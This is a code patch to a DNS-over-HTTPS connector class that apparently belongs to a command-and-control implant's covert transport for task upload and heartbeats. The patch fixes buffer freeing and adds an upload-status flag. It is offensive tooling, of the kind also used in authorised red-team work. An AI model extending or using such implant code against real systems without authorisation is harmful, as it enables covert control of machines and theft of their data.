@@ -213,7 +213,7 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 void ConnectorDoH::CloseConnector()
 {
     if (this->recvData) {
-        this->functions->LocalFree(this->recvData);
+        MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
         this->recvData = NULL;
         this->recvSize = 0;
     }
@@ -880,6 +880,7 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	//    frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
 	// -------------------------------------------------------------------------
 	if (data && data_size) {
+		this->lastQueryOk = TRUE;
 		const ULONG metaSize = sizeof(DNS_META_V1);
 		const ULONG headerSize = metaSize + 8; // meta + [total][offset]
 		ULONG total = data_size;
@@ -956,6 +957,7 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			}
 			
 			if (!putOk) {
+				this->lastQueryOk = FALSE;
 				return;  // Abort upload, will retry entire upload next time
 			}
 
@@ -967,6 +969,7 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			offset += chunk;
 		}
 		this->lastUpTotal = total;
+		this->lastQueryOk = TRUE;
 		
 		// After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
 		// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
@@ -1352,7 +1355,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 
 BYTE* ConnectorDoH::RecvData() { return this->recvData; }
 int ConnectorDoH::RecvSize() { return this->recvSize; }
-void ConnectorDoH::RecvClear() { this->recvData = NULL; this->recvSize = 0; }
+void ConnectorDoH::RecvClear() {
+	if (this->recvData) {
+		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
+		this->recvData = NULL;
+		this->recvSize = 0;
+	}
+}
 
 void ConnectorDoH::ReportProtocolResult(BOOL success)
 {
